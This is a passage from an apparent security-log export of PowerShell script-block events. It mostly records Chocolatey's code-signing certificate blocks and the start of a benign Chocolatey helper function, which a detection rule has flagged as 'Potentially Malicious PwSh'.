hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgweHzSplZ494On1UQFNZDNo1+C5hVFonFT0Z4 # XKG21e0wDQYJKoZIhvcNAQEBBQAEggEABukrTx8PYcKco9MQ6RcHIKVMqR9HLAnV # PohcjWRijEW5TfoLp6uGzyhKKHGDjH0+ZwkJ+J5O3IX5erp7MUuTVidPB87iW1Gz # fUgUvX12PnTzEvOp3p49uyqCzeXgH4NVl6/iZsYqlKefg94rX6oOBhMAWFotjBu9 # gG3udMTnJMaN6dlMy1ijbv+kaaIlMBUJluoWePzhsqFpm8B9RF1pfYcic/6z1QMi # jGzmtqMGC2bDkyvwQzAJOm0ChHMS6+79B83+i4DZ8XLSWVLVfIbjHHPxUWTJCRXw # nCIsBEJtwmk4AjHoIrMdsN058HnBAse/nS7NThZYlWoQEwbbgvqruKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU1WjAjBgkqhkiG9w0BCQQxFgQUyY9g1N0HMjWVyi3G # LWmwfeJbhiswDQYJKoZIhvcNAQEBBQAEggEATgvFSijRgKyoEI8ttKowwtSVxAwN # gNXzSRpGuaOjNEejxlaOw7DbhvHzcOEYcXvrQmD1uavDntsAte2qWMA7e+fS8ztV # Afb8ttnPHwjfFCyZ54u7SjkKZxShf9JdMRUIvpbv3HL6k/gJgfQVVkQRwyQGXRAO # CVDG7mzU3B8D8u1SnQzfryLwIFBd28p/wtijIzci4msUDlX2+VVGr+IBcSIsaa9Y # h1atL3hS6VuF4yL64iRXcICn1Ev68OPqTxeQd2UZHqZKVjL4h+4iGS/WZ6zoLxN/ # aGRaodZ1dtzz4uT610c7uWpKmAzb9V/cUwhahEiSspNng09908jESsHDAg== # SIG # End signature block","MessageNumber: 2 ¦ MessageTotal: 2 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Get-ChocolateyUnzip.ps1 ¦ ScriptBlockId: 1419c8c9-958e-44c3-9d03-ff48afcea7cc ¦ ScriptBlockText: ZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgweHzSplZ494On1UQFNZDNo1+C5hVFonFT0Z4 # XKG21e0wDQYJKoZIhvcNAQEBBQAEggEABukrTx8PYcKco9MQ6RcHIKVMqR9HLAnV # PohcjWRijEW5TfoLp6uGzyhKKHGDjH0+ZwkJ+J5O3IX5erp7MUuTVidPB87iW1Gz # fUgUvX12PnTzEvOp3p49uyqCzeXgH4NVl6/iZsYqlKefg94rX6oOBhMAWFotjBu9 # gG3udMTnJMaN6dlMy1ijbv+kaaIlMBUJluoWePzhsqFpm8B9RF1pfYcic/6z1QMi # jGzmtqMGC2bDkyvwQzAJOm0ChHMS6+79B83+i4DZ8XLSWVLVfIbjHHPxUWTJCRXw # nCIsBEJtwmk4AjHoIrMdsN058HnBAse/nS7NThZYlWoQEwbbgvqruKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU1WjAjBgkqhkiG9w0BCQQxFgQUyY9g1N0HMjWVyi3G # LWmwfeJbhiswDQYJKoZIhvcNAQEBBQAEggEATgvFSijRgKyoEI8ttKowwtSVxAwN # gNXzSRpGuaOjNEejxlaOw7DbhvHzcOEYcXvrQmD1uavDntsAte2qWMA7e+fS8ztV # Afb8ttnPHwjfFCyZ54u7SjkKZxShf9JdMRUIvpbv3HL6k/gJgfQVVkQRwyQGXRAO # CVDG7mzU3B8D8u1SnQzfryLwIFBd28p/wtijIzci4msUDlX2+VVGr+IBcSIsaa9Y # h1atL3hS6VuF4yL64iRXcICn1Ev68OPqTxeQd2UZHqZKVjL4h+4iGS/WZ6zoLxN/ # aGRaodZ1dtzz4uT610c7uWpKmAzb9V/cUwhahEiSspNng09908jESsHDAg== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:36.590 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,72,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-OSArchitectureWidth { <# .SYNOPSIS Get the operating system architecture address width. .DESCRIPTION This will return the system architecture address width (probably 32 or 64 bit). If you pass a comparison, it will return true or false instead of {`32`|`64`}. .NOTES When your installation script has to know what architecture it is run on, this simple function comes in handy. Available as `Get-OSArchitectureWidth` in 0.9.10+. If you need compatibility with pre 0.9.10, please use the alias `Get-ProcessorBits`. .INPUTS None .OUTPUTS None .PARAMETER Compare This optional parameter causes the function to return $true or $false, depending on wether or not the bit width matches. #> param( 